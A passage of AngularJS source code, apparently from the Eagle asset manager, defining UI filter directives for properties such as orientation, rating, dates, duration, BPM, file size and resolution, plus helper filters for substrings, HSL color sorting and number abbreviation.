        			$scope.displayName = displayName;
                    analytics.event('Filter', 'Type');
        		}
        		else {
        			$scope.isEnabled = false;
        			$scope.displayName = displayName;
        		}
        		setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
        	}
        	$scope.clearTypesFilter = function (event) {
        		event && event.stopPropagation();
                eagle.filter.filterRules.type = {}
        		$scope.$body.page = 1; 
        		$scope.$body.filterContent();
        		$scope.changeDisplayName();
        	}
        	$scope.$on("Reset_Filter", function (event) {
        		$scope.changeDisplayName();
        	});
		}
	}
});
EagleApp.directive('filterItemShape', function($rootScope, $timeout) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/filter-item-shape.html',
        replace: true,
        link: function($scope, elem, attrs) {
        	$scope.$body = angular.element("body").scope();
        	$scope.displayName = i18n.__("filter.orientation");
        	$scope.isEnabled = false;
        	$scope.changeDisplayName = function () {
        		var displayName = i18n.__("filter.orientation");
        		if (eagle.filter.filterRules.shape.landscape || eagle.filter.filterRules.shape.portrait || eagle.filter.filterRules.shape.square || eagle.filter.filterRules.shape.panoramicLandscape || eagle.filter.filterRules.shape.panoramicPortrait || eagle.filter.filterRules.shape.custom || eagle.filter.filterRules.shape['43'] || eagle.filter.filterRules.shape['34'] || eagle.filter.filterRules.shape['169'] || eagle.filter.filterRules.shape['916']) {
        			displayName = "";
        			var arr = [];
        			if (eagle.filter.filterRules.shape.landscape) { arr.push(i18n.__("filter.orientation>landscape")); }
        			if (eagle.filter.filterRules.shape.portrait) { arr.push(i18n.__("filter.orientation>portrait")); }
        			if (eagle.filter.filterRules.shape.square) { arr.push(i18n.__("filter.orientation>square")); }
        			if (eagle.filter.filterRules.shape.panoramicLandscape) { arr.push(i18n.__("filter.orientation>panoramicLandscape")); }
        			if (eagle.filter.filterRules.shape.panoramicPortrait) { arr.push(i18n.__("filter.orientation>panoramicPortrait")); }
                    if (eagle.filter.filterRules.shape['43']) { arr.push("4:3"); }
                    if (eagle.filter.filterRules.shape['34']) { arr.push("3:4"); }
                    if (eagle.filter.filterRules.shape['169']) { arr.push("16:9"); }
                    if (eagle.filter.filterRules.shape['916']) { arr.push("9:16"); }
                    if (eagle.filter.filterRules.shape.custom && eagle.filter.filterRules.shape.width && eagle.filter.filterRules.shape.height) { 
                        arr.push(`${eagle.filter.filterRules.shape.width}:${eagle.filter.filterRules.shape.height}`); 
                    }
        			if (arr.length > 0) {
        				$scope.isEnabled = true;
        				displayName += arr.join(",");
        			}
        			$scope.displayName = displayName;
                    analytics.event('Filter', 'Shape');
        		}
        		else {
        			$scope.isEnabled = false;
        			$scope.displayName = displayName;
        		}
        		setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
        	}
            $scope.focusCustomFilterWidth = function () {
                setTimeout(function () {
                    if (eagle.filter.filterRules.shape.custom) {
                        $("#custom-shape-filter-w").focus();
                    }
                    else {
                        $scope.focusInput();
                    }
                }, 200);
            }
        	$scope.clearShapeFilter = function (event) {
        		event && event.stopPropagation();
        		eagle.filter.filterRules.shape.landscape = eagle.filter.filterRules.shape.portrait = eagle.filter.filterRules.shape.square = eagle.filter.filterRules.shape.panoramicLandscape = eagle.filter.filterRules.shape.panoramicPortrait = eagle.filter.filterRules.shape.custom = eagle.filter.filterRules.shape['43'] = eagle.filter.filterRules.shape['34'] = eagle.filter.filterRules.shape['169'] = eagle.filter.filterRules.shape['916'] = false;
        		$scope.$body.page = 1; 
        		$scope.$body.filterContent();
        		$scope.changeDisplayName();
        	}
        	$scope.$on("Reset_Filter", function (event) {
        		$scope.changeDisplayName();
        	});
		}
	}
});
EagleApp.directive('filterItemRating', function($rootScope, $timeout) {
    return {
    	restrict: 'E',
        templateUrl: 'js/directives/filter-item-rating.html',
        replace: true,
        link: function($scope, elem, attrs) {
        	$scope.$body = angular.element("body").scope();
        	$scope.displayName = i18n.__("filter.rating");
        	$scope.isEnabled = false;
        	$scope.changeDisplayName = function () {
        		var displayName = i18n.__("filter.rating");
        		if (eagle.filter.filterRules.rating['5'] || eagle.filter.filterRules.rating['4'] || eagle.filter.filterRules.rating['3'] || eagle.filter.filterRules.rating['2'] || eagle.filter.filterRules.rating['1'] || eagle.filter.filterRules.rating['0']) {
        			displayName = "";
        			var arr = [];
        			if (eagle.filter.filterRules.rating['5']) { arr.push(5); }
        			if (eagle.filter.filterRules.rating['4']) { arr.push(4); }
        			if (eagle.filter.filterRules.rating['3']) { arr.push(3); }
        			if (eagle.filter.filterRules.rating['2']) { arr.push(2); }
        			if (eagle.filter.filterRules.rating['1']) { arr.push(1); }
        			if (eagle.filter.filterRules.rating['0']) { arr.push(i18n.__("filter.rating>none")); }
        			if (arr.length > 0) {
        				$scope.isEnabled = true;
        				displayName += arr.join(",");
        			}
        			$scope.displayName = displayName;
                    analytics.event('Filter', 'Rating');
        		}
        		else {
        			$scope.isEnabled = false;
        			$scope.displayName = displayName;
        		}
        		setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
        	}
        	$scope.clearRatingFilter = function (event) {
        		event && event.stopPropagation();
        		eagle.filter.filterRules.rating['5'] = eagle.filter.filterRules.rating['4'] = eagle.filter.filterRules.rating['3'] = eagle.filter.filterRules.rating['2'] = eagle.filter.filterRules.rating['1'] = eagle.filter.filterRules.rating['0'] = false;
        		$scope.$body.page = 1; 
        		$scope.$body.filterContent();
        		$scope.changeDisplayName();
        	}
        	$scope.$on("Reset_Filter", function (event) {
        		$scope.changeDisplayName();
        	});
		}
	}
});
EagleApp.directive('filterItemFonts', function($rootScope, $timeout) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/filter-item-fonts.html',
        replace: true,
        link: function($scope, elem, attrs) {
            $scope.$body = angular.element("body").scope();
            $scope.displayName = i18n.__("filter.fontActivated");
            $scope.isEnabled = false;
            $scope.changeDisplayName = function () {
                var displayName = i18n.__("filter.fontActivated");
                if (eagle.filter.filterRules.font.activated || eagle.filter.filterRules.font.deactivated) {
                    $scope.isEnabled = true;
                    if (eagle.filter.filterRules.font.activated) {
                        $scope.displayName = i18n.__("filter.fontActivated>activated");
                    }
                    else if (eagle.filter.filterRules.font.deactivated) {
                        $scope.displayName = i18n.__("filter.fontActivated>deactivated");
                    }
                    analytics.event('Filter', 'Font');
                }
                else {
                    $scope.displayName = i18n.__("filter.fontActivated");
                    $scope.isEnabled = false;
                }
                setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
            }
            $scope.clearFontActivatedFilter = function (event) {
                event && event.stopPropagation();
                eagle.filter.filterRules.font.activated = false;
                eagle.filter.filterRules.font.deactivated = false;
                $scope.$body.page = 1; 
                $scope.$body.filterContent();
                $scope.changeDisplayName();
            }
            $scope.$on("Reset_Filter", function (event) {
                $scope.changeDisplayName();
            });
        }
    }
});
EagleApp.directive('filterItemCamera', function($rootScope, $timeout) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/filter-item-camera.html',
        replace: true,
        link: function($scope, elem, attrs) {
            $scope.$body = angular.element("body").scope();
            $scope.displayName = i18n.__("filter.camera");
            $scope.isEnabled = false;
            $scope.selectCamera = function (camera) {
                if (eagle.filter.filterRules.camera[camera]) {
                    delete eagle.filter.filterRules.camera[camera];
                }
                else {
                    eagle.filter.filterRules.camera[camera] = true;
                }
            };
            $scope.changeDisplayName = function () {
                var displayName = i18n.__("filter.camera");
                // if (eagle.filter.filterRules.rating['5'] || eagle.filter.filterRules.rating['4'] || eagle.filter.filterRules.rating['3'] || eagle.filter.filterRules.rating['2'] || eagle.filter.filterRules.rating['1'] || eagle.filter.filterRules.rating['0']) {
                if (Object.keys(eagle.filter.filterRules.camera).length > 0) {
                    displayName = "";

                    var selectedCameras = Object.keys(eagle.filter.filterRules.camera);
                    var arr = [];

                    selectedCameras.forEach(function (camera) {
                        arr.push(camera);
                    });
                    
                    if (arr.length > 0) {
                        $scope.isEnabled = true;
                        displayName += arr.join(",");
                        $scope.displayName = displayName;
                        analytics.event('Filter', 'Camera');
                    }
                    else {
                        $scope.isEnabled = false;
                        $scope.displayName = i18n.__("filter.camera");
                    }
                }
                else {
                    $scope.isEnabled = false;
                    $scope.displayName = displayName;
                }
                setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
            }
            $scope.clearCameraFilter = function (event) {
                event && event.stopPropagation();
                eagle.filter.filterRules.camera = {};
                $scope.$body.page = 1; 
                $scope.$body.filterContent();
                $scope.changeDisplayName();
            }
            $scope.$on("Reset_Filter", function (event) {
                $scope.changeDisplayName();
            });
        }
    }
});
EagleApp.directive('filterItemImport', function($rootScope, $timeout) {
    return {
    	restrict: 'E',
        templateUrl: 'js/directives/filter-item-import.html',
        replace: true,
        link: function($scope, elem, attrs) {
        	$scope.$body = angular.element("body").scope();
        	$scope.displayName = i18n.__("modal.smartFolder.rule.propertyCreateTime");
        	$scope.isEnabled = false;

            elem.on("open", function () {
                // 計算日期篩選器很耗時，延後到打開在計算
                console.time("calculateDateFilter");
                $scope.$body.calculateDateFilter();
                $scope.$body.filterImportDateMonths = $scope.$body.getDateFilterCountsArray("date");
                $scope.$body.filterModifyDateMonths = $scope.$body.getDateFilterCountsArray("mtime");
                console.timeEnd("calculateDateFilter");
                $scope.$body.$evalAsync();
            });

        	$scope.changeDisplayName = function () {
        		var displayName = i18n.__("modal.smartFolder.rule.propertyCreateTime");
        		if (
        			eagle.filter.filterRules.import.today ||
		            eagle.filter.filterRules.import.yesterday ||
		            eagle.filter.filterRules.import.last7day ||
		            eagle.filter.filterRules.import.last30day ||
		            eagle.filter.filterRules.import.last90day ||
		            eagle.filter.filterRules.import.last365day ||
		            eagle.filter.filterRules.import.usingRange ||
                    Object.keys(eagle.filter.filterRules.import.selectedMonths).length > 0
    			) {
        			displayName = "";
        			var arr = [];
        			if (eagle.filter.filterRules.import.today) { arr.push(i18n.__("filter.import>today")); };
					if (eagle.filter.filterRules.import.yesterday) { arr.push(i18n.__("filter.import>yesterday")); };
					if (eagle.filter.filterRules.import.last7day) { arr.push(i18n.__("filter.import>last7Days")); };
					if (eagle.filter.filterRules.import.last30day) { arr.push(i18n.__("filter.import>last30Days")); };
					if (eagle.filter.filterRules.import.last90day) { arr.push(i18n.__("filter.import>last90Days")); };
					if (eagle.filter.filterRules.import.last365day) { arr.push(i18n.__("filter.import>last365Days")); };
					if (eagle.filter.filterRules.import.usingRange) { arr.push(i18n.__("filter.import>range")); };
                    var keys = Object.keys(eagle.filter.filterRules.import.selectedMonths);

                    arr = [...arr, ...keys];
        			
        			if (arr.length > 0) {
        				$scope.isEnabled = true;
        				displayName += arr.join(",");
        			}
        			$scope.displayName = displayName;
                    analytics.event('Filter', 'Date');
        		}
                else {
        			$scope.isEnabled = false;
        			$scope.displayName = displayName;
        		}
        		setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
        	}

            $scope.filterImportYYYYMM = function (key) {
                if (!eagle.filter.filterRules.import.selectedMonths[key]) {
                    eagle.filter.filterRules.import.selectedMonths[key] = true;
                }
                else {
                    delete eagle.filter.filterRules.import.selectedMonths[key];
                }
            }

        	$scope.focusDatePicker = function () {
        		setTimeout(function () {
        			$("#filter-date-picker").focus();
        		}, 100);
        	};

        	$scope.clearDateFilter = function (event) {
        		event && event.stopPropagation();
                eagle.filter.filterRules.import.selectedMonths = {};
        		eagle.filter.filterRules.import.today = false;
	            eagle.filter.filterRules.import.yesterday = false;
	            eagle.filter.filterRules.import.last7day = false;
	            eagle.filter.filterRules.import.last30day = false;
	            eagle.filter.filterRules.import.last90day = false;
	            eagle.filter.filterRules.import.last365day = false;
	            eagle.filter.filterRules.import.usingRange = false;
        		$scope.$body.page = 1; 
        		$scope.$body.filterContent();
        		$scope.changeDisplayName();
                $scope.$body.filterImportDateMonths = [];
                $scope.$body.filterModifyDateMonths = [];
        	}
        	$scope.$on("Reset_Filter", function (event) {
        		$scope.changeDisplayName();
        	});
		}
	}
});
EagleApp.directive('filterItemMtime', function($rootScope, $timeout) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/filter-item-mtime.html',
        replace: true,
        link: function($scope, elem, attrs) {
            $scope.$body = angular.element("body").scope();
            $scope.displayName = i18n.__("modal.smartFolder.rule.propertyMTime");
            $scope.isEnabled = false;
            
            elem.on("open", function () {
                // 計算日期篩選器很耗時，延後到打開在計算
                console.time("calculateDateFilter");
                $scope.$body.calculateDateFilter();
                $scope.$body.filterImportDateMonths = $scope.$body.getDateFilterCountsArray("date");
                $scope.$body.filterModifyDateMonths = $scope.$body.getDateFilterCountsArray("mtime");
                console.timeEnd("calculateDateFilter");
                $scope.$body.$evalAsync();
            });

            $scope.changeDisplayName = function () {
                var displayName = i18n.__("modal.smartFolder.rule.propertyMTime");
                if (
                    eagle.filter.filterRules.mtime.today ||
                    eagle.filter.filterRules.mtime.yesterday ||
                    eagle.filter.filterRules.mtime.last7day ||
                    eagle.filter.filterRules.mtime.last30day ||
                    eagle.filter.filterRules.mtime.last90day ||
                    eagle.filter.filterRules.mtime.last365day ||
                    eagle.filter.filterRules.mtime.usingRange ||
                    Object.keys(eagle.filter.filterRules.mtime.selectedMonths).length > 0
                ) {
                    displayName = "";
                    var arr = [];
                    if (eagle.filter.filterRules.mtime.today) { arr.push(i18n.__("filter.import>today")); };
                    if (eagle.filter.filterRules.mtime.yesterday) { arr.push(i18n.__("filter.import>yesterday")); };
                    if (eagle.filter.filterRules.mtime.last7day) { arr.push(i18n.__("filter.import>last7Days")); };
                    if (eagle.filter.filterRules.mtime.last30day) { arr.push(i18n.__("filter.import>last30Days")); };
                    if (eagle.filter.filterRules.mtime.last90day) { arr.push(i18n.__("filter.import>last90Days")); };
                    if (eagle.filter.filterRules.mtime.last365day) { arr.push(i18n.__("filter.import>last365Days")); };
                    if (eagle.filter.filterRules.mtime.usingRange) { arr.push(i18n.__("filter.import>range")); };
                    var keys = Object.keys(eagle.filter.filterRules.mtime.selectedMonths);

                    arr = [...arr, ...keys];

                    if (arr.length > 0) {
                        $scope.isEnabled = true;
                        displayName += arr.join(",");
                    }
                    $scope.displayName = displayName;
                    analytics.event('Filter', 'Date');
                }
                else {
                    $scope.isEnabled = false;
                    $scope.displayName = displayName;
                }
                setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
            }

            $scope.filterModifyYYYYMM = function (key) {
                if (!eagle.filter.filterRules.mtime.selectedMonths[key]) {
                    eagle.filter.filterRules.mtime.selectedMonths[key] = true;
                }
                else {
                    delete eagle.filter.filterRules.mtime.selectedMonths[key];
                }
            }

            $scope.focusDatePicker = function () {
                setTimeout(function () {
                    $("#filter-date-picker").focus();
                }, 100);
            };

            $scope.clearDateFilter = function (event) {
                event && event.stopPropagation();
                eagle.filter.filterRules.mtime.selectedMonths = {};
                eagle.filter.filterRules.mtime.today = false;
                eagle.filter.filterRules.mtime.yesterday = false;
                eagle.filter.filterRules.mtime.last7day = false;
                eagle.filter.filterRules.mtime.last30day = false;
                eagle.filter.filterRules.mtime.last90day = false;
                eagle.filter.filterRules.mtime.last365day = false;
                eagle.filter.filterRules.mtime.usingRange = false;
                $scope.$body.page = 1; 
                $scope.$body.filterContent();
                $scope.changeDisplayName();
            }
            $scope.$on("Reset_Filter", function (event) {
                $scope.changeDisplayName();
            });
        }
    }
});

EagleApp.directive('filterItemDuration', function($rootScope, $timeout) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/filter-item-duration.html',
        replace: true,
        link: function($scope, elem, attrs) {
            $scope.$body = angular.element("body").scope();
            $scope.displayName = i18n.__("filter.duration");
            $scope.isEnabled = false;
            $scope.changeDisplayName = function () {
                var displayName = i18n.__("filter.duration");
                if (
                    eagle.filter.filterRules.duration.min ||
                    eagle.filter.filterRules.duration.max
                ) {
                    displayName = "";
                    var arr = [];
                    if (eagle.filter.filterRules.duration.min > 0 && eagle.filter.filterRules.duration.max > 0) { 
                        displayName += `${eagle.filter.filterRules.duration.min}≤${i18n.__("filter.duration")}≤${eagle.filter.filterRules.duration.max}`
                    }
                    else if (eagle.filter.filterRules.duration.min > 0) { 
                        displayName += `${i18n.__("filter.duration")}≥${eagle.filter.filterRules.duration.min}`
                    }
                    else if (eagle.filter.filterRules.duration.max > 0) { 
                        displayName += `${i18n.__("filter.duration")}≤${eagle.filter.filterRules.duration.max}`
                    }

                    if (eagle.filter.filterRules.duration.min > 0 || eagle.filter.filterRules.duration.max > 0) {
                        displayName += eagle.filter.filterRules.duration.unit;
                    }

                    if (displayName !== i18n.__("filter.duration")) {
                        $scope.isEnabled = true;
                    }

                    $scope.displayName = displayName;
                    analytics.event('Filter', 'Duration');
                }
                else {
                    $scope.isEnabled = false;
                    $scope.displayName = displayName;
                }

                setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
            }
            $scope.clearDurationFilter = function (event) {
                event && event.stopPropagation();
                eagle.filter.filterRules.duration.min = undefined;
                eagle.filter.filterRules.duration.max = undefined;
                $scope.$body.page = 1; 
                $scope.$body.filterContent();
                $scope.changeDisplayName();
            }
            $scope.$on("Reset_Filter", function (event) {
                $scope.changeDisplayName();
            });
        }
    }
});
EagleApp.directive('filterItemBpm', function($rootScope, $timeout) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/filter-item-bpm.html',
        replace: true,
        link: function($scope, elem, attrs) {
            $scope.$body = angular.element("body").scope();
            $scope.displayName = "BPM";
            $scope.isEnabled = false;
            $scope.changeDisplayName = function () {
                var displayName = "BPM";
                if (
                    eagle.filter.filterRules.bpm.min ||
                    eagle.filter.filterRules.bpm.max
                ) {
                    displayName = "";
                    var arr = [];
                    if (eagle.filter.filterRules.bpm.min > 0 && eagle.filter.filterRules.bpm.max > 0) { 
                        displayName += `${eagle.filter.filterRules.bpm.min}≤${"BPM"}≤${eagle.filter.filterRules.bpm.max}`
                    }
                    else if (eagle.filter.filterRules.bpm.min > 0) { 
                        displayName += `${"BPM"}≥${eagle.filter.filterRules.bpm.min}`
                    }
                    else if (eagle.filter.filterRules.bpm.max > 0) { 
                        displayName += `${"BPM"}≤${eagle.filter.filterRules.bpm.max}`
                    }

                    if (displayName !== "BPM") {
                        $scope.isEnabled = true;
                    }

                    $scope.displayName = displayName;
                    analytics.event('Filter', 'BPM');
                }
                else {
                    $scope.isEnabled = false;
                    $scope.displayName = displayName;
                }

                setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
            }
            $scope.clearBPMFilter = function (event) {
                event && event.stopPropagation();
                eagle.filter.filterRules.bpm.min = undefined;
                eagle.filter.filterRules.bpm.max = undefined;
                $scope.$body.page = 1; 
                $scope.$body.filterContent();
                $scope.changeDisplayName();
            }
            $scope.$on("Reset_Filter", function (event) {
                $scope.changeDisplayName();
            });
        }
    }
});

EagleApp.directive('filterItemSize', function($rootScope, $timeout) {
    return {
    	restrict: 'E',
        templateUrl: 'js/directives/filter-item-size.html',
        replace: true,
        link: function($scope, elem, attrs) {
        	$scope.$body = angular.element("body").scope();
        	$scope.displayName = i18n.__("filter.fileSize");
        	$scope.isEnabled = false;
        	$scope.changeDisplayName = function () {
        		var displayName = i18n.__("filter.fileSize");
        		if (
        			eagle.filter.filterRules.file.min ||
		            eagle.filter.filterRules.file.max
    			) {
        			displayName = "";
        			var arr = [];
        			if (eagle.filter.filterRules.file.min > 0 && eagle.filter.filterRules.file.max > 0) { 
        				displayName += `${eagle.filter.filterRules.file.min}≤${i18n.__("filter.fileSize")}≤${eagle.filter.filterRules.file.max}`
        			}
        			else if (eagle.filter.filterRules.file.min > 0) { 
        				displayName += `${i18n.__("filter.fileSize")}≥${eagle.filter.filterRules.file.min}`
        			}
        			else if (eagle.filter.filterRules.file.max > 0) { 
        				displayName += `${i18n.__("filter.fileSize")}≤${eagle.filter.filterRules.file.max}`
        			}

        			if (eagle.filter.filterRules.file.min > 0 || eagle.filter.filterRules.file.max > 0) {
        				displayName += eagle.filter.filterRules.file.unit.toUpperCase();
        			}

        			if (displayName !== i18n.__("filter.fileSize")) {
        				$scope.isEnabled = true;
        			}

        			$scope.displayName = displayName;
                    analytics.event('Filter', 'Size');
        		}
        		else {
        			$scope.isEnabled = false;
        			$scope.displayName = displayName;
        		}

        		setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
        	}
        	$scope.clearSizeFilter = function (event) {
        		event && event.stopPropagation();
        		eagle.filter.filterRules.file.min = undefined;
            	eagle.filter.filterRules.file.max = undefined;
        		$scope.$body.page = 1; 
        		$scope.$body.filterContent();
        		$scope.changeDisplayName();
        	}
        	$scope.$on("Reset_Filter", function (event) {
        		$scope.changeDisplayName();
        	});
		}
	}
});
EagleApp.directive('filterItemResolution', function($rootScope, $timeout) {
    return {
    	restrict: 'E',
        templateUrl: 'js/directives/filter-item-resolution.html',
        replace: true,
        link: function($scope, elem, attrs) {
        	$scope.$body = angular.element("body").scope();
        	$scope.displayName = i18n.__("filter.resolution");
        	$scope.isEnabled = false;
        	$scope.changeDisplayName = function () {
        		var displayName = i18n.__("filter.resolution");
        		if (
        			eagle.filter.filterRules.resolution.minW ||
		            eagle.filter.filterRules.resolution.maxW ||
		            eagle.filter.filterRules.resolution.minH ||
		            eagle.filter.filterRules.resolution.maxH
    			) {
        			displayName = "";
        			var arr = [];
        			if (eagle.filter.filterRules.resolution.minW > 0 && eagle.filter.filterRules.resolution.maxW > 0) { 
        				displayName += `${eagle.filter.filterRules.resolution.minW}≤${i18n.__("filter.resolution>width")}≤${eagle.filter.filterRules.resolution.maxW}`
        			}
        			else if (eagle.filter.filterRules.resolution.minW > 0) { 
        				displayName += `${i18n.__("filter.resolution>width")}≥${eagle.filter.filterRules.resolution.minW}`
        			}
        			else if (eagle.filter.filterRules.resolution.maxW > 0) { 
        				displayName += `${i18n.__("filter.resolution>width")}≤${eagle.filter.filterRules.resolution.maxW}`
        			}

        			if ((eagle.filter.filterRules.resolution.minW > 0 || eagle.filter.filterRules.resolution.maxW > 0) && (eagle.filter.filterRules.resolution.minH > 0 || eagle.filter.filterRules.resolution.maxH > 0) ) { 
        				displayName += ", ";
        			}

        			if (eagle.filter.filterRules.resolution.minH > 0 && eagle.filter.filterRules.resolution.maxH > 0) { 
        				displayName += `${eagle.filter.filterRules.resolution.minH}≤${i18n.__("filter.resolution>height")}≤${eagle.filter.filterRules.resolution.maxH}`
        			}
        			else if (eagle.filter.filterRules.resolution.minH > 0) { 
        				displayName += `${i18n.__("filter.resolution>height")}≥${eagle.filter.filterRules.resolution.minH}`
        			}
        			else if (eagle.filter.filterRules.resolution.maxH > 0) { 
        				displayName += `${i18n.__("filter.resolution>height")}≤${eagle.filter.filterRules.resolution.maxH}`
        			}

        			if (displayName !== i18n.__("filter.resolution")) {
        				$scope.isEnabled = true;
        			}

        			$scope.displayName = displayName;
                    analytics.event('Filter', 'Resolution');
        		}
        		else {
        			$scope.isEnabled = false;
        			$scope.displayName = displayName;
        		}

        		setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
        	}
        	$scope.clearResolutionFilter = function (event) {
        		event && event.stopPropagation();
        		eagle.filter.filterRules.resolution.minW = undefined;
	            eagle.filter.filterRules.resolution.maxW = undefined;
	            eagle.filter.filterRules.resolution.minH = undefined;
	            eagle.filter.filterRules.resolution.maxH = undefined;
        		$scope.$body.page = 1; 
        		$scope.$body.filterContent();
        		$scope.changeDisplayName();
        	}
        	$scope.$on("Reset_Filter", function (event) {
        		$scope.changeDisplayName();
        	});
		}
	}
});
EagleApp.directive('filterItemAnnotation', function($rootScope, $timeout) {
    return {
    	restrict: 'E',
        templateUrl: 'js/directives/filter-item-annotation.html',
        replace: true,
        link: function($scope, elem, attrs) {
        	$scope.$body = angular.element("body").scope();
        	$scope.displayName = i18n.__("filter.comments");
        	$scope.isEnabled = false;
        	$scope.changeDisplayName = function () {
        		var displayName = i18n.__("filter.comments");
        		if (eagle.filter.filterRules.annotation.has || eagle.filter.filterRules.annotation.no) {
        			displayName = "";
        			var arr = [];
        			if (eagle.filter.filterRules.annotation.has) { arr.push(i18n.__("Filter.Yes")); }
        			if (eagle.filter.filterRules.annotation.no) { arr.push(i18n.__("Filter.No")); }

        			if (eagle.filter.filterRules.annotation.keywords) {
        				$scope.isEnabled = true;
        				displayName += eagle.filter.filterRules.annotation.keywords;
        			}
        			else if (arr.length > 0) {
        				$scope.isEnabled = true;
        				displayName += arr.join(",");
        			}
        			$scope.displayName = displayName;
                    analytics.event('Filter', 'Annotation');
        		}
        		else {
        			$scope.isEnabled = false;
        			$scope.displayName = displayName;
        		}
        		setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
        	}
        	$scope.clearAnnotationFilter = function (event) {
        		event && event.stopPropagation();
        		eagle.filter.filterRules.annotation.has = eagle.filter.filterRules.annotation.no = false;
        		eagle.filter.filterRules.annotation.keywords = undefined;
        		$scope.$body.page = 1; 
        		$scope.$body.filterContent();
        		$scope.changeDisplayName();
        	}
        	$scope.$on("Reset_Filter", function (event) {
        		$scope.changeDisplayName();
        	});
		}
	}
});
EagleApp.directive('filterItemNote', function($rootScope, $timeout) {
    return {
    	restrict: 'E',
        templateUrl: 'js/directives/filter-item-note.html',
        replace: true,
        link: function($scope, elem, attrs) {
        	$scope.$body = angular.element("body").scope();
        	$scope.displayName = i18n.__("filter.annotation");
        	$scope.isEnabled = false;
        	$scope.changeDisplayName = function () {
        		var displayName = i18n.__("filter.annotation");
        		if (eagle.filter.filterRules.note.has || eagle.filter.filterRules.note.no) {
        			displayName = "";
        			var arr = [];
        			if (eagle.filter.filterRules.note.has) { arr.push(i18n.__("Filter.Yes")); }
        			if (eagle.filter.filterRules.note.no) { arr.push(i18n.__("Filter.No")); }

        			if (eagle.filter.filterRules.note.keywords) {
        				$scope.isEnabled = true;
        				displayName += eagle.filter.filterRules.note.keywords;
        			}
        			else if (arr.length > 0) {
        				$scope.isEnabled = true;
        				displayName += arr.join(",");
        			}
        			$scope.displayName = displayName;
                    analytics.event('Filter', 'Note');
        		}
        		else {
        			$scope.isEnabled = false;
        			$scope.displayName = displayName;
        		}
        		setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
        	}
        	$scope.clearNoteFilter = function (event) {
        		event && event.stopPropagation();
        		eagle.filter.filterRules.note.has = eagle.filter.filterRules.note.no = false;
        		eagle.filter.filterRules.note.keywords = undefined;
        		$scope.$body.page = 1; 
        		$scope.$body.filterContent();
        		$scope.changeDisplayName();
        	}
        	$scope.$on("Reset_Filter", function (event) {
        		$scope.changeDisplayName();
        	});
		}
	}
});
EagleApp.directive('filterItemUrl', function($rootScope, $timeout) {
    return {
    	restrict: 'E',
        templateUrl: 'js/directives/filter-item-url.html',
        replace: true,
        link: function($scope, elem, attrs) {
        	$scope.$body = angular.element("body").scope();
        	$scope.displayName = i18n.__("filter.url");
        	$scope.isEnabled = false;
        	$scope.changeDisplayName = function () {
        		var displayName = i18n.__("filter.url");
        		if (eagle.filter.filterRules.url.has || eagle.filter.filterRules.url.no) {
        			displayName = "";
        			var arr = [];
        			if (eagle.filter.filterRules.url.has) { arr.push(i18n.__("Filter.Yes")); }
        			if (eagle.filter.filterRules.url.no) { arr.push(i18n.__("Filter.No")); }

        			if (eagle.filter.filterRules.url.keywords) {
        				$scope.isEnabled = true;
        				displayName += eagle.filter.filterRules.url.keywords;
        			}
        			else if (arr.length > 0) {
        				$scope.isEnabled = true;
        				displayName += arr.join(",");
        			}
        			$scope.displayName = displayName;
                    analytics.event('Filter', 'URL');
        		}
        		else {
        			$scope.isEnabled = false;
        			$scope.displayName = displayName;
        		}
        		setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
        	}
        	$scope.clearUrlFilter = function (event) {
        		event && event.stopPropagation();
        		eagle.filter.filterRules.url.has = eagle.filter.filterRules.url.no = false;
        		eagle.filter.filterRules.url.keywords = undefined;
        		$scope.$body.page = 1; 
        		$scope.$body.filterContent();
        		$scope.changeDisplayName();
        	}
        	$scope.$on("Reset_Filter", function (event) {
        		$scope.changeDisplayName();
        	});
		}
	}
});
EagleApp.filter('substring', function() {
    return function(input, start, end) {
        if (!input || !input?.substring) return '';
        return input.substring(start, end);
    };
});

EagleApp.filter('sortHSL', function () {
    return function (palettes) {
        try {
            if (!palettes) return;
            const getHSL = (color) => {
                const [r, g, b] = [color[0], color[1], color[2]];
                const hsl = colorConvert.rgb.hsl(r, g, b);
                const [h, s, l] = [hsl[0], hsl[1], hsl[2]];
                return [h, s, l];
            };

            // 將最大 ratio 的顏色放在最前面，其它維持原本的順序
            const maxRatioPalette = palettes.reduce((prev, curr) => {
                return prev.ratio > curr.ratio ? prev : curr;
            });
            const maxRatio = maxRatioPalette.ratio;
            const maxRatioHSL = getHSL(maxRatioPalette.color);
            let others = palettes.filter((color) => color.ratio !== maxRatio);

            // sort others base on maxRatioHSL
            others = others.sort((a, b) => {
                const hslA = getHSL(a.color);
                const hslB = getHSL(b.color);

                const hADiff = Math.abs(hslA[0] - maxRatioHSL[0]);
                const hBDiff = Math.abs(hslB[0] - maxRatioHSL[0]);
                const sADiff = Math.abs(hslA[1] - maxRatioHSL[1]);
                const sBDiff = Math.abs(hslB[1] - maxRatioHSL[1]);
                const lADiff = Math.abs(hslA[2] - maxRatioHSL[2]);
                const lBDiff = Math.abs(hslB[2] - maxRatioHSL[2]);

                if (Math.abs(hADiff - hBDiff) >= 30) {
                    return hADiff - hBDiff;
                }
                else if (Math.abs(sADiff - sBDiff) >= 10) {
                    return sADiff - sBDiff;
                }
                else {
                    return lADiff - lBDiff;
                }
            });

            const result = [maxRatioPalette, ...others];
            return result;
        }
        catch (err) {
            return palettes.sort((a, b) => {
                return a.ratio - b.ratio;
            });
        }
    };
});

EagleApp.filter('numberAbbreviate', function () {
    return function (input) {
        if (isNaN(input)) return null;
        if (input < 1000) {
            return input;
        }
        if (input >= 1000 && input < 1000000) {
            return (input / 1000).toFixed(1) + 'K';
        }
        if (input >= 1000000 && input < 1000000000) {
